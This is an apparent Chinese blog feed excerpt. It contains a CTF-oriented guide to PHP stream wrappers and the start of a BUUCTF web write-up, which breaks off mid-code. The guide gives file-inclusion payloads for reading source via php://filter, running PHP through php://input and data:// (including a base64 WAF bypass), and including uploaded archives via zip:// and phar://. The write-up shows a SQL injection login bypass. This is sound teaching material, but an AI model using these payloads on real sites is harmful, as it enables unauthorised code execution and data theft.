        <content type="html"><![CDATA[<h2 id="PHP伪协议总结"><a href="#PHP伪协议总结" class="headerlink" title="PHP伪协议总结"></a>PHP伪协议总结</h2><h3 id="PHP支持的伪协议"><a href="#PHP支持的伪协议" class="headerlink" title="PHP支持的伪协议"></a>PHP支持的伪协议</h3><p>PHP伪协议是其支持的协议与封装协议，其支持的协议有：</p><pre class="language-none"><code class="language-none">php:// — 访问各个输入/输出流（I/O streams）file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLszlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流</code></pre><h3 id="php-x2F-x2F-协议"><a href="#php-x2F-x2F-协议" class="headerlink" title="php://协议"></a>php://协议</h3><p>使用条件：</p><pre class="language-none"><code class="language-none">不需要开启`allow_url_fopen`仅`php://input、 php://stdin、 php://memory 和 php://temp `需要开启`allow_url_include`。</code></pre><p><code>php://</code>访问各个输入/输出流<code>I/O streams）</code>，在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行<code>php</code>代码。</p><p>下面对其进行详细介绍：</p><h4 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p><code>CTF</code>中常用的伪协议，可以用来读取文件，是一种元封装器，设计用于数据流打开时的筛选过滤应用。其中一种最典型的利用方式如下：</p><pre class="language-none"><code class="language-none">index.php?file=php://filter/read=convert.base64-encode/resource=index.php// 这里读的过滤器为convert.base64-encode，就和字面上的意思一样，把输入流base64-encode。// resource=upload.php，代表读取upload.php的内容</code></pre><p>上述代码意为使用<code>base64</code>编码的形式将<code>index.php</code>读取出来。对于上述利用方式具体每部分的含义，可以参照下图</p><p><img src="/posts/6443/1.png"></p><p>在这里，涉及到一个过滤器的概念，<code>PHP</code>过滤器用于验证和过滤来自非安全来源的数据，比如用户的输入。在这里之所以可以使用过滤器读取文件，相当于是将文件作为过滤器输入，获取其经过处理之后的数据流，而在<code>PHP</code>中，过滤器有很多种，分别为：</p><ul><li><a href="https://www.php.net/manual/zh/filters.string.php">字符串过滤器</a></li><li><a href="https://www.php.net/manual/zh/filters.convert.php">转换过滤器</a></li><li><a href="https://www.php.net/manual/zh/filters.compression.php">压缩过滤器</a></li><li><a href="https://www.php.net/manual/zh/filters.encryption.php">加密过滤器</a></li></ul><h5 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h5><pre class="language-none"><code class="language-none">string.rot13// 进行rot13转换// 自 PHP 4.3.0 起，使用此过滤器等同于用 str_rot13()函数处理所有的流数据。string.toupper// 将字符全部大写string.tolower// 将字符全部小写string.strip_tags// 去除空字符、HTML 和 PHP 标记后的结果。// 功能类似于strip_tags()函数，若不想某些字符不被消除，后面跟上字符，可利用字符串或是数组两种方式。</code></pre><ul><li>示例-string.rot13</li></ul><pre class="language-none"><code class="language-none">&lt;?php$fp = fopen('php://output', 'w');stream_filter_append($fp, 'string.rot13');fwrite($fp, "This is a test.\n");?&gt;/* Outputs:  Guvf vf n grfg.   */// string.toupper（自 PHP 5.0.0 起）使用此过滤器等同于用 strtoupper()函数处理所有的流数据。</code></pre><ul><li>示例-string.toupper</li></ul><pre class="language-none"><code class="language-none">&lt;?php$fp = fopen('php://output', 'w');stream_filter_append($fp, 'string.toupper');fwrite($fp, "This is a test.\n");?&gt;/* Outputs:  THIS IS A TEST.   */// string.tolower（自 PHP 5.0.0 起）使用此过滤器等同于用 strtolower()函数处理所有的流数据。</code></pre><ul><li>示例-string.tolower</li></ul><pre class="language-none"><code class="language-none">&lt;?php$fp = fopen('php://output', 'w');stream_filter_append($fp, 'string.tolower');fwrite($fp, "This is a test.\n");?&gt;/* Outputs:  this is a test.   */</code></pre><h5 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h5><p>如同<code>string.*</code>过滤器，<code>convert.*</code>过滤器的作用就和其名字一样。转换过滤器是<code>PHP 5.0.0</code>添加的。</p><p>以常用的<code>convert.base64-encode</code>和<code>convert.base64-decode</code>为例，使用这两个过滤器等同于分别用<code>base64_encode()</code>和<code>base64_decode()</code>函数处理所有的流数据。</p><p><code>convert.base64-encode</code>支持以一个关联数组给出的参数。如果给出了<code>line-length</code>，<code>base64</code>输出将被用<code>line-length</code>个字符为 长度而截成块。如果给出了<code>line-break-chars</code>，每块将被用给出的字符隔开。这些参数的效果和用<code>base64_encode()</code>再加上<code>chunk_split()</code>相同。</p><ul><li>示例-convert.base64-encode &amp; convert.base64-decode</li></ul><pre class="language-none"><code class="language-none">&lt;?php$fp = fopen('php://output', 'w');stream_filter_append($fp, 'convert.base64-encode');fwrite($fp, "This is a test.\n");fclose($fp);/* Outputs:  VGhpcyBpcyBhIHRlc3QuCg==  */$param = array('line-length' =&gt; 8, 'line-break-chars' =&gt; "\r\n");$fp = fopen('php://output', 'w');stream_filter_append($fp, 'convert.base64-encode', STREAM_FILTER_WRITE, $param);fwrite($fp, "This is a test.\n");fclose($fp);/* Outputs:  VGhpcyBp          :  cyBhIHRl          :  c3QuCg==  */$fp = fopen('php://output', 'w');stream_filter_append($fp, 'convert.base64-decode');fwrite($fp, "VGhpcyBpcyBhIHRlc3QuCg==");fclose($fp);/* Outputs:  This is a test.  */?&gt;</code></pre><p>除此之外，还有<code>convert.quoted-printable-encode</code>和<code>convert.quoted-printable-decode</code>两个过滤器。</p><p>使用此过滤器的<code>decode</code>等同于用<code>quoted_printable_decode()</code>函数处理所有的流数据。没有和<code>convert.quoted-printable-encode</code>对应的函数。</p><p><code>convert.quoted-printable-encode</code>支持以一个关联数组给出的参数。除了支持和<code>convert.base64-encode</code>一样的附加参数外，<code>convert.quoted-printable-encode</code>还支持布尔参数<code>binary</code>和<code>force-encode-first</code>。<code>convert.base64-decode</code>只支持<code>line-break-chars</code>参数作为从编码载荷中剥离的类型提示。</p><ul><li>示例-convert.quoted-printable-encode &amp; convert.quoted-printable-decode</li></ul><pre class="language-none"><code class="language-none">&lt;?php$fp = fopen('php://output', 'w');stream_filter_append($fp, 'convert.quoted-printable-encode');fwrite($fp, "This is a test.\n");/* Outputs:  =This is a test.=0A  */?&gt;</code></pre><h5 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h5><p>正如名字所提到的，其作用也是类似，虽然在<code>PHP</code>伪协议中，有压缩封装协议<code>(zlib://, bzip2://, zip://)</code>，提供了在本地文件系统中 创建 gzip 和 bz2 兼容文件的方法，但不代表可以在网络的流中提供通用压缩的意思，也不代表可以将一个非压缩的流转换成一个压缩流。对此，压缩过滤器可以在任何时候应用于任何流资源。</p><p>另外，需要注意的是，压缩过滤器不产生命令行工具如<code>gzip</code>的头和尾信息。只是压缩和解压数据流中的有效载荷部分。其中主要有<code>zlib.* , bzip2.*</code>两类压缩过滤器：</p><p><code>zlib.deflate</code>（压缩）和<code>zlib.inflate</code>（解压）实现了<code>RFC 1951</code>中的的压缩算法。 <code>zlib.*</code>压缩过滤器自 <code>PHP</code> 版本 <code>5.1.0</code>起可用，在激活 <code>zlib</code>的前提下。也可以通过安装来自<code>PECL</code>的<code>zlib_filter</code>包作为一个后门在<code>5.0.x</code>版中使用。此过滤器在<code>PHP 4</code>中不可用。</p><p>其中，deflate过滤器最多可以接受三个参数。分别为：</p><ul><li><code>level</code> 定义了压缩强度（1-9）。数字更高通常会产生更小的载荷，但要消耗更多的处理时间。存在两个特殊压缩等级：0（完全不压缩）和 -1（zlib 内部默认值，目前是 6）。</li><li><code>window</code> 压缩回溯窗口大小，以二的次方表示。更高的值（大到 15 —— 32768 字节）产生更好的压缩效果但消耗更多内存，低的值（低到 9 —— 512 字节）产生产生较差的压缩效果但内存消耗低。目前默认的 window大小是 15。</li><li><code>memory</code> 用来指示要分配多少工作内存。合法的数值范围是从 1（最小分配）到 9（最大分配）。内存分配仅影响速度，不会影响生成的载荷的大小。</li></ul><p>下面为该压缩过滤器的示例：</p><ul><li>示例-zlib.deflate和 zlib.inflate</li></ul><pre class="language-none"><code class="language-none">&lt;?php$params = array('level' =&gt; 6, 'window' =&gt; 15, 'memory' =&gt; 9);$original_text = "This is a test.\nThis is only a test.\nThis is not an important string.\n";echo "The original text is " . strlen($original_text) . " characters long.\n";$fp = fopen('test.deflated', 'w');stream_filter_append($fp, 'zlib.deflate', STREAM_FILTER_WRITE, $params);fwrite($fp, $original_text);fclose($fp);echo "The compressed file is " . filesize('test.deflated') . " bytes long.\n";echo "The original text was:\n";/* Use readfile and zlib.inflate to decompress on the fly */readfile('php://filter/zlib.inflate/resource=test.deflated');/* Generates output:The original text is 70 characters long.The compressed file is 56 bytes long.The original text was:This is a test.This is only a test.This is not an important string. */?&gt;</code></pre><ul><li>示例-zlib.deflate简单参数用法</li></ul><pre class="language-none"><code class="language-none">&lt;?php$original_text = "This is a test.\nThis is only a test.\nThis is not an important string.\n";echo "The original text is " . strlen($original_text) . " characters long.\n";$fp = fopen('test.deflated', 'w');/* Here "6" indicates compression level 6 */stream_filter_append($fp, 'zlib.deflate', STREAM_FILTER_WRITE, 6);fwrite($fp, $original_text);fclose($fp);echo "The compressed file is " . filesize('test.deflated') . " bytes long.\n";/* Generates output:The original text is 70 characters long.The compressed file is 56 bytes long. */?&gt;</code></pre><p><code>bzip2.compress</code>和<code>bzip2.decompress</code>工作的方式与上面讲的<code>zlib.*</code>过滤器相同。 自<code>PHP 5.1.0</code>起可用，在激活 <code>bz2</code>支持的前提下。也可以通过安装来自<code>PECL</code>的<code>bz2_filter</code>包作为一个后门在<code>5.0.x</code>版中使用。此过滤器在<code>PHP 4</code>中 不可用。</p><p><code>bzip2.compress</code>过滤器接受最多两个参数：</p><ul><li><code>blocks</code> 从 1 到 9 的整数值，指定分配多少个 100K 字节的内存块作为工作区。</li><li><code>work</code> 0 到 250 的整数值，指定在退回到一个慢一些，但更可靠的算法之前做多少次常规压缩算法的尝试。调整此参数仅影响到速度，压缩输出和内存使用都不受此设置的影响。将此参数设为 0 指示 bzip 库使用内部默认算法。</li></ul><p><code>bzip2.decompress</code>过滤器仅接受一个参数，可以用普通的布尔值传递，或者用一个关联数组中的<code>small</code>单元传递。当<code>small</code>设为<code>&amp;true</code>; 值时，指示<code>bzip</code>库用最小的内存占用来执行解压缩，代价是速度会慢一些。</p><p>下面为其使用示例：</p><ul><li>示例-bzip2.compress和 bzip2.decompress</li></ul><pre class="language-none"><code class="language-none">&lt;?php$param = array('blocks' =&gt; 9, 'work' =&gt; 0);echo "The original file is " . filesize('LICENSE') . " bytes long.\n";$fp = fopen('LICENSE.compressed', 'w');stream_filter_append($fp, 'bzip2.compress', STREAM_FILTER_WRITE, $param);fwrite($fp, file_get_contents('LICENSE'));fclose($fp);echo "The compressed file is " . filesize('LICENSE.compressed') . " bytes long.\n";/* Generates output:The original text is 3288 characters long.The compressed file is 1488 bytes long. */?&gt;</code></pre><h5 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h5><p>加密过滤器为<code>mcrypt.*</code>和<code>mdecrypt.*</code>，使用<code>libmcrypt</code>提供了对称的加密和解密。这两组过滤器都支持<code>mcrypt</code>扩展库中相同的算法，格式为<code>mcrypt.ciphername</code>，其中<code>ciphername</code>是密码的名字，将被传递给<code>mcrypt_module_open()</code>。有以下五个过滤器参数可用：</p><p><img src="/posts/6443/2.png"></p><ul><li>示例-用 3DES 将文件加密输出</li></ul><pre class="language-none"><code class="language-none">&lt;?php$passphrase = 'My secret';/* Turn a human readable passphrase * into a reproducable iv/key pair */$iv = substr(md5('iv'.$passphrase, true), 0, 8);$key = substr(md5('pass1'.$passphrase, true) .               md5('pass2'.$passphrase, true), 0, 24);$opts = array('iv'=&gt;$iv, 'key'=&gt;$key);$fp = fopen('secert-file.enc', 'wb');stream_filter_append($fp, 'mcrypt.tripledes', STREAM_FILTER_WRITE, $opts);fwrite($fp, 'Secret secret secret data');fclose($fp);?&gt;</code></pre><ul><li>示例-读取加密的文件</li></ul><pre class="language-none"><code class="language-none">&lt;?php$passphrase = 'My secret';/* Turn a human readable passphrase * into a reproducable iv/key pair */$iv = substr(md5('iv'.$passphrase, true), 0, 8);$key = substr(md5('pass1'.$passphrase, true) .               md5('pass2'.$passphrase, true), 0, 24);$opts = array('iv'=&gt;$iv, 'key'=&gt;$key);$fp = fopen('secert-file.enc', 'rb');stream_filter_append($fp, 'mdecrypt.tripledes', STREAM_FILTER_WRITE, $opts);$data = rtrim(stream_get_contents($fp));fclose($fp);echo $data;?&gt;</code></pre><h4 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php://input"></a>php://input</h4><p>php://input是个可以访问请求的原始数据的只读流，将post请求中的数据作为PHP代码执行。当传进去的参数作为文件名变量去打开文件时，可以将参数php://input，同时post方式传进去值作为文件内容，供php代码执行时当做文件内容读取</p><p>利用条件：</p><pre class="language-none"><code class="language-none">allow_url_include = Onallow_url_fopen = On/Off</code></pre><p>利用姿势：</p><pre class="language-none"><code class="language-none">index.php?file=php://inputPOST:&lt;?php phpinfo();?&gt;/&lt;? phpinfo();?&gt;</code></pre><p>需要注意的是，在<code>PHP 5.6</code>之前<code>php://input</code>打开的数据流只能读取一次； 数据流不支持<code>seek</code>操作。 不过，依赖于<code>SAPI</code>的实现，请求体数据被保存的时候， 它可以打开另一个<code>php://input</code>数据流并重新读取。 通常情况下，这种情况只是针对 POST 请求，而不是其他请求方式，比如<code>PUT</code>或者<code>PROPFIND</code>。</p><p>在<code>php://</code>伪协议中，除了上述两种在<code>CTF</code>中常用的之外，还有一些其他的，比如下面这些：</p><ul><li>php://output 一个只写的数据流， 允许以<code>print</code>和<code>echo</code>一样的方式 写入到输出缓冲区。</li><li>php://fd 允许直接访问指定的文件描述符。 例如<code>php://fd/3</code>引用了文件描述符<code>3</code>。</li><li>php://memory/php://temp 一个类似文件包装器的数据流，允许读写临时数据。</li><li>php://stdin/php://stdout/php://stderr 允许直接访问 PHP 进程相应的输入或者输出流</li></ul><h3 id="http-s-x2F-x2F-协议"><a href="#http-s-x2F-x2F-协议" class="headerlink" title="http(s):// 协议"></a>http(s):// 协议</h3><p>用以访问<code>HTTP(s)</code>网址，允许通过<code>HTTP 1.0</code>的<code>GET</code>方法，以只读访问文件或资源。 <code>HTTP</code>请求会附带一个<code>Host:</code>头，用于兼容基于域名的虚拟主机。 如果在<code>php.ini</code>文件中或字节流上下文<code>（context）</code>配置了<code>user_agent</code>字符串，它也会被包含在请求之中。使用需要满足以下条件：</p><pre class="language-none"><code class="language-none">allow_url_fopen:onallow_url_include :on</code></pre><p>用法：</p><pre class="language-none"><code class="language-none">http://example.comhttp://example.com/file.php?var1=val1&amp;var2=val2http://user:password@example.comhttps://example.comhttps://example.com/file.php?var1=val1&amp;var2=val2https://user:password@example.com</code></pre><ul><li>示例-检测重定向后最终的 URL</li></ul><pre class="language-none"><code class="language-none">&lt;?php$url = 'http://www.example.com/redirecting_page.php';$fp = fopen($url, 'r');$meta_data = stream_get_meta_data($fp);foreach ($meta_data['wrapper_data'] as $response) {    /* 我们是否被重定向了？ */    if (strtolower(substr($response, 0, 10)) == 'location: ') {        /* 更新我们被重定向后的 $url */        $url = substr($response, 10);    }}?&gt;</code></pre><h3 id="ftp-s-x2F-x2F-协议"><a href="#ftp-s-x2F-x2F-协议" class="headerlink" title="ftp(s):// 协议"></a>ftp(s):// 协议</h3><p>用以访问<code>FTP(s) URLs</code>，允许通过<code>FTP</code>读取存在的文件，以及创建新文件。 如果服务器不支持被动<code>（passive）</code>模式的<code>FTP</code>，连接会失败。</p><p>打开文件后你既可以读也可以写，但是不能同时进行。 当远程文件已经存在于<code>ftp</code>服务器上，如果尝试打开并写入文件的时候， 未指定上下文<code>（context）</code>选项<code>overwrite</code>，连接会失败。 如果要通过<code>FTP</code>覆盖存在的文件， 指定上下文<code>（context）</code>的<code>overwrite</code>选项来打开、写入。 另外可使用<code>FTP</code>扩展来代替。</p><p>需要注意的是：如果设置了<code>php.ini</code>中的<code>from</code>指令，这个值会作为匿名<code>（anonymous）ftp</code>的密码。</p><h3 id="zlib-x2F-x2F-amp-bzip2-x2F-x2F-amp-zip-x2F-协议"><a href="#zlib-x2F-x2F-amp-bzip2-x2F-x2F-amp-zip-x2F-协议" class="headerlink" title="zlib:// &amp; bzip2:// &amp; zip:/ 协议"></a>zlib:// &amp; bzip2:// &amp; zip:/ 协议</h3><p><code>php</code>伪协议中的压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀<code>(jpg png gif xxx)</code>等等。其使用条件为：</p><pre class="language-none"><code class="language-none">allow_url_fopen:off/onallow_url_include :off/on</code></pre><ul><li>示例-使用<code>zip://</code>压缩<code>phpinfo.txt</code>为<code>phpinfo.zip</code> ，压缩包重命名为<code>phpinfo.jpg</code> ，并上传</li></ul><pre class="language-none"><code class="language-none">http://127.0.0.1/include.php?file=zip://home/test/WWW/phpinfo.jpg%23phpinfo.txt</code></pre><ul><li>示例-使用<code>compress.bzip2://file.bz2</code>压缩<code>phpinfo.txt</code>为<code>phpinfo.bz2</code>并上传（同样支持任意后缀名）</li></ul><pre class="language-none"><code class="language-none">http://127.0.0.1/include.php?file=compress.bzip2://home/test/WWW/phpinfo.bz2</code></pre><ul><li>示例-使用<code>compress.zlib://file.gz</code>压缩<code>phpinfo.txt</code>为<code>phpinfo.gz</code>并上传（同样支持任意后缀名）</li></ul><pre class="language-none"><code class="language-none">http://127.0.0.1/include.php?file=compress.zlib://home/test/WWW/phpinfo.gz</code></pre><h3 id="data-x2F-x2F-协议"><a href="#data-x2F-x2F-协议" class="headerlink" title="data:// 协议"></a>data:// 协议</h3><p>自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行<code>PHP</code>代码。使用条件为：</p><pre class="language-none"><code class="language-none">allow_url_fopen:onallow_url_include :on</code></pre><p>可以支持明文或编码，用法为：</p><pre class="language-none"><code class="language-none">data://text/plain,XXXdata://text/plain;base64,XXX格式为：data://资源类型;编码,内容</code></pre><ul><li>示例-使用明文方式读取<code>phpinfo()</code></li></ul><pre class="language-none"><code class="language-none">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></pre><p><img src="/posts/6443/3.png"></p><ul><li>示例-使用<code>base64</code>方式（CTF中可用以绕过waf）读取<code>phpinfo()</code></li></ul><pre class="language-none"><code class="language-none">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><ul><li>示例-打印<code>data://</code>的内容</li></ul><pre class="language-none"><code class="language-none">&lt;?php// 打印 "I love PHP"echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo=');?&gt;</code></pre><h3 id="glob-x2F-x2F-协议"><a href="#glob-x2F-x2F-协议" class="headerlink" title="glob:// 协议"></a>glob:// 协议</h3><p>查找匹配的文件路径模式, 自<code>PHP 5.3.0</code>起开始有效。下面为其基本用法：</p><pre class="language-none"><code class="language-none">&lt;?php// 循环 ext/spl/examples/ 目录里所有 *.php 文件// 并打印文件名和文件尺寸$it = new DirectoryIterator("glob://ext/spl/examples/*.php");foreach($it as $f) {    printf("%s: %.1FK\n", $f-&gt;getFilename(), $f-&gt;getSize()/1024);}?&gt;output:tree.php: 1.0Kfindregex.php: 0.6Kfindfile.php: 0.7Kdba_dump.php: 0.9Knocvsdir.php: 1.1Kphar_from_dir.php: 1.0Kini_groups.php: 0.9Kdirectorytree.php: 0.9Kdba_array.php: 1.1Kclass_tree.php: 1.8K</code></pre><h3 id="phar-x2F-x2F-协议"><a href="#phar-x2F-x2F-协议" class="headerlink" title="phar:// 协议"></a>phar:// 协议</h3><p>用以<code>PHP归档</code>，数据流包装器自<code>PHP 5.3.0</code>起开始有效，与<code>zip://</code>类似，同样可以访问<code>zip</code>格式压缩包内容，比如下面这个例子：</p><pre class="language-none"><code class="language-none">http://127.0.0.1/include.php?file=phar://home/test/WWW/phpinfo.zip/phpinfo.txt</code></pre><p>该伪协议在<code>CTF</code>中比较常见，主要用于反序列化和文件包含，此文中只对其用于文件包含进行介绍，反序列化在后面将会单独拿出来讲。在文件包含中，该协议主要用于支持<code>zip、phar</code>格式的文件包含，用法如下：</p><pre class="language-none"><code class="language-none">?file=phar://[压缩包文件相对路径]/[压缩文件内的子文件名]?file=phar://[压缩包文件绝对路径]/[压缩文件内的子文件名]</code></pre><ul><li>示例-配合文件上传漏洞，当仅可以上传zip格式时</li></ul><pre class="language-none"><code class="language-none">index.php?file=phar://index.zip/index.txtindex.php?file=phar://home/test/WWW/FI/index.zip/index.txt</code></pre><ul><li>示例-配合文件上传漏洞，当仅可以上传图片格式时，<code>phar://</code>不管后缀是什么，都会当做压缩包来解压。</li></ul><pre class="language-none"><code class="language-none">index.php?file=phar://head.png/head.txtindex.php?file=phar://home/test/WWW/FI/head.png/head.txt</code></pre><h3 id="file-x2F-x2F-协议"><a href="#file-x2F-x2F-协议" class="headerlink" title="file:// 协议"></a>file:// 协议</h3><p>用于访问本地文件系统，可以使用相对路径或绝对路径来访问文件系统文件，其使用样例为：</p><pre class="language-none"><code class="language-none">/path/to/file.extrelative/path/to/file.extfileInCwd.extC:/path/to/winfile.extC:\path\to\winfile.ext\\smbserver\share\path\to\winfile.extfile:///path/to/file.ext</code></pre><p>该伪协议在CTF中通常用来读取本地文件，因为其在双<code>off</code>的情况下也可以正常使用，不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。</p><ul><li>示例-使用文件的相对路径和文件名</li></ul><pre class="language-none"><code class="language-none">http://127.0.0.1/include.php?file=./phpinfo.txt</code></pre><ul><li>示例-使用文件的绝对路径和文件名</li></ul><pre class="language-none"><code class="language-none">http://127.0.0.1/include.php?file=file://home/test/WWW/phpinfo.txt</code></pre><h3 id="ssh2-x2F-x2F-协议"><a href="#ssh2-x2F-x2F-协议" class="headerlink" title="ssh2:// 协议"></a>ssh2:// 协议</h3><p><code>Secure Shell 2</code>，默认没有激活，如果需要使用<code>ssh2.*://</code>封装协议，必须安装来自<code>PECL</code>的<code>SSH2</code>扩展，主要形式有：</p><pre class="language-none"><code class="language-none">ssh2.shell://ssh2.exec://ssh2.tunnel://ssh2.sftp://ssh2.scp://</code></pre><p>该伪协议除了支持传统的<code>URI</code>登录信息，<code>ssh2</code>封装协议也支持通过<code>URL</code>的主机<code>（host）</code>部分来复用打开连接，用法如下所示：</p><pre class="language-none"><code class="language-none">ssh2.shell://user:pass@example.com:22/xtermssh2.exec://user:pass@example.com:22/usr/local/bin/somecmdssh2.tunnel://user:pass@example.com:22/192.168.0.1:14ssh2.sftp://user:pass@example.com:22/path/to/filename</code></pre><p>下面为一个示例，用以从一个活动连接中打开字节流：</p><pre class="language-none"><code class="language-none">&lt;?php$session = ssh2_connect('example.com', 22);ssh2_auth_pubkey_file($session, 'username', '/home/username/.ssh/id_rsa.pub',                                            '/home/username/.ssh/id_rsa', 'secret');$stream = fopen("ssh2.tunnel://$session/remote.example.com:1234", 'r');?&gt;</code></pre><h3 id="ogg-x2F-x2F-协议"><a href="#ogg-x2F-x2F-协议" class="headerlink" title="ogg:// 协议"></a>ogg:// 协议</h3><p>音频流协议，用以读取<code>OGG/Vorbis</code>格式的压缩音频编码，并能通过该伪协议写入或追加压缩音频数据，默认未激活，使用需要安装<code>PECL</code>中的<code>OGG/Vorbis</code>扩展。用法如下：</p><pre class="language-none"><code class="language-none">ogg://soundfile.oggogg:///path/to/soundfile.oggogg://http://www.example.com/path/to/soundstream.ogg</code></pre><h3 id="expect-x2F-x2F-协议"><a href="#expect-x2F-x2F-协议" class="headerlink" title="expect:// 协议"></a>expect:// 协议</h3><p>用以处理交互式的流，由<code>expect://</code>封装协议打开的数据流<code>PTY</code>提供了对进程<code>stdio</code>、<code>stdout</code>和<code>stderr</code>的访问，默认未开启，使用须安装<code>PECL</code>上的<code>Expect</code>扩展。用法如下：</p><pre class="language-none"><code class="language-none">expect://command</code></pre><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.php.net/manual/zh/wrappers.php">PHP 支持和封装的协议</a><br>       <a href="https://www.php.net/manual/zh/wrappers.php.php">php:// 官方文档</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-web-1-10</title>
      <link href="/posts/56672/"/>
      <url>/posts/56672/</url>
      
        <content type="html"><![CDATA[<h3 id="一、EasySQL"><a href="#一、EasySQL" class="headerlink" title="一、EasySQL"></a>一、EasySQL</h3><p>打开题目是一个要求输入用户名和密码的登录页面，根据题意网站可能存在SQL注入，我们首先判断一下是否有注入。我们测试简单SQL语句: <strong>‘and 1=2</strong>页面回显报错，说明后台执行了我们的SQL语句，所以密码框存在注入。</p><p><img src="/posts/56672/1.png"></p><p>我们尝试在用户框和密码框输入语句: <strong>‘or 1=1#</strong> ，登录成功得到flag。</p><p><img src="/posts/56672/2.png"></p><h3 id="二、WarmUp"><a href="#二、WarmUp" class="headerlink" title="二、WarmUp"></a>二、WarmUp</h3><p>首先题目提示本题为PHP代码审计，所以我们要去找PHP代码页面。打开题目发现只有一个滑稽表情，于是我们检查页面查看代码，源代码注释中有提示信息: <strong>source.php</strong>，直接在地址栏中输入: <strong>/source.php</strong>页面返回了PHP源码。</p><p><img src="/posts/56672/3.png"></p><p><img src="/posts/56672/4.png"></p><p>在代码审计之前先了解几个PHP中的函数。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token comment">//用于检测变量是否已经设置并且非NULL。</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token comment">//用于检测变量是否是字符串。</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$needle</span><span class="token punctuation">,</span><span class="token keyword type-declaration">array</span><span class="token punctuation">)</span><span class="token comment">//用于检查array中是否存在$needle值。</span><span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span>start<span class="token punctuation">,</span>length<span class="token punctuation">)</span><span class="token comment">//截取字符串$str一部分，从start开始，长度为length的子串。</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span>start<span class="token punctuation">,</span>length<span class="token punctuation">)</span><span class="token comment">//同mb_substr()，但区别是substr()不能截取中文。</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$needle</span><span class="token punctuation">,</span>start<span class="token punctuation">)</span><span class="token comment">//同strpos()，但可查找中文，strpos()不能查找中文。按字查找。</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$needle</span><span class="token punctuation">,</span>start<span class="token punctuation">)</span><span class="token comment">//查找字符串$needle在$str中第一次出现的位置。按字节查找。</span></code></pre><p>源码如下：</p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span 